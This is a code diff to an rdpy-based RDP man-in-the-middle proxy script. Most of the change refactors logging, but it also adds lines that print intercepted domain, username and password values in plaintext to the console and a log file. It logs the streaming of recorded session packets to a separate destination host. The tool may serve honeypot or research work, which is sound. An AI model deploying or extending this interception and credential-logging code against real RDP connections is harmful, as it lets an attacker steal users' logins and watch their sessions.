@@ -29,14 +29,15 @@ Client RDP -> | ProxyServer | ProxyClient | -> Server RDP
                    -----------------
 """
 import argparse
+import logging
 import signal
 import sys, os, getopt, time
 
-from rdpy.core import log, error, rss
+from rdpy.core import error, rss, log
 from rdpy.protocol.rdp import rdp
 from twisted.internet import reactor
 
-log._LOG_LEVEL = log.Level.INFO
+log._LOG_LEVEL = logging.INFO
 
 
 class ProxyServer(rdp.RDPServerObserver):
@@ -75,12 +76,9 @@ class ProxyServer(rdp.RDPServerObserver):
             #try a connection
             domain, username, password = self._controller.getCredentials()
             hostname = self._controller.getHostname()
-            log.info("""Credentials:
-            \tdomain : %s
-            \tusername : %s
-            \tpassword : %s
-            \thostname : %s
-            """%(domain, username, password, hostname))
+            clog.warning("NEW SUCCESSFUL CONNECTION")
+            clog.warning("Credentials: domain : {} username : {} "
+                         "password : {} hostname : {}".format(domain, username, password, hostname))
 
             for recorder in self._rss_recorders:
                 recorder.credentials(username, password, domain, self._controller.getHostname())
@@ -155,6 +153,7 @@ class ProxyServer(rdp.RDPServerObserver):
         self.onClose()
         reactor.stop()
 
+
 class ProxyServerFactory(rdp.ServerFactory):
     """
     @summary: Factory on listening events
@@ -187,6 +186,8 @@ class ProxyServerFactory(rdp.ServerFactory):
         self._uniqueId += 1
         recorders = []
         if self._destination_ip:
+            mlog.info("Using socketRecorder, sending packets to {}:{}".format(self._destination_ip,
+                                                                              self._destination_port))
             recorders.append(rss.createSocketRecorder(self._destination_ip, self._destination_port))
         recorders.append(rss.createRecorder(os.path.join(self._ouputDir, "%s_%s_%s.rss" % (time.strftime('%Y%m%d%H%M%S'), addr.host, self._uniqueId))))
         return ProxyServer(controller, self._target, self._clientSecurity, recorders)
@@ -298,7 +299,35 @@ def parseIpPort(interface, defaultPort = "3389"):
         return interface, defaultPort
 
 
+def prepare_loggers():
+    """
+        Sets up the "rdp-mitm" and the "rdp-mitm.connections" loggers to print
+        messages and send notifications on connect.
+    """
+    if not os.path.exists("log"):
+        os.makedirs("log")
+
+    mitm_logger = logging.getLogger("mitm")
+    mitm_logger.setLevel(logging.DEBUG)
+
+    mitm_connections_logger = logging.getLogger("mitm.connections")
+    mitm_connections_logger.setLevel(logging.INFO)
+
+    formatter = logging.Formatter("[%(asctime)s] - MITM       - %(levelname)s - %(message)s")
+
+    stream_handler = logging.StreamHandler()
+    file_handler = logging.FileHandler("log/mitm.log")
+    stream_handler.setFormatter(formatter)
+    file_handler.setFormatter(formatter)
+    mitm_logger.addHandler(stream_handler)
+    mitm_logger.addHandler(file_handler)
+
+
 if __name__ == '__main__':
+
+    prepare_loggers()
+    mlog = logging.getLogger("mitm")
+    clog = logging.getLogger("mitm.connections")
 
     parser = argparse.ArgumentParser()
     parser.add_argument("target", help="IP:port of the target RDP machine (ex: 129.168.0.2:3390)")
@@ -321,7 +350,7 @@ if __name__ == '__main__':
     clientSecurity = rdp.SecurityLevel.RDP_LEVEL_SSL
 
     if args.output is None or not os.path.dirname(args.output):
-        log.error("{} is an invalid output directory".format(args.output))
+        mlog.error("{} is an invalid output directory".format(args.output))
         parser.print_help()
         exit(1)
     if args.nla:
@@ -329,6 +358,9 @@ if __name__ == '__main__':
     elif args.standard_security:
         clientSecurity = rdp.SecurityLevel.RDP_LEVEL_RDP
 
+    mlog.info("Starting MITM. Listen on port {}. "
+              "Target VM: {}. send to livePlayer: {}:{}".format(args.listen, args.target, args.destination_ip,
+                                                                args.destination_port))
     reactor.listenTCP(args.listen, ProxyServerFactory(parseIpPort(args.target), args.output, args.private_key,
                                                       args.certificate, clientSecurity,
                                                       args.destination_ip, int(args.destination_port)))
